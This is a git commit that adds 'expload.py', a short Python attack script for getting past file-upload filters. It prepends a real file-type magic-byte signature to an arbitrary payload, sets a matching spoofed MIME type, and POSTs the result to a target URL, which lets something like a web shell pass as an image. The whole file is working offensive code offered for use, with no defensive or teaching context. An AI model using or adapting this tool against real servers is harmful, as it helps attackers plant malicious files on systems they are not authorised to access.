02615d9d567ca1831f4b7f054b37fb39fb91c6f1
witchdocsec <107813117+witchdocsec@users.noreply.github.com>
2024-09-20 10:53:08 +0100

    Add files via upload

---
+++ expload.py
@@ -0,0 +1,32 @@
+import tempfile
+from pyfsig import constants
+import requests
+import mimetypes
+import lib.parse
+mimetypes.init()
+
+
+def grabsig(ext):
+    for sig in constants.SIGNATURES:
+        if sig["file_extension"] == ext:
+            return "".join([chr(h) for h in sig["hex"]]).encode("utf-8"), mimetypes.types_map[f".{ext}"]
+
+def fileupload():
+    ext=args.ext
+    name=args.name
+    filename=args.filename
+    with open(args.payload,"r") as payload:
+        content=payload.read().encode("utf-8")
+    with tempfile.NamedTemporaryFile() as tmp:
+        sig,mime=grabsig(ext)
+        tmp.write(sig)
+        tmp.write(b"\n")
+        tmp.write(content)
+        tmp.seek(0)
+        files = {name: (filename, tmp, mime)}
+        r = requests.post(args.url, files=files)    
+        print(r.text)      
+
+if __name__ == "__main__":
+    args=lib.parse.parser()
+    fileupload()
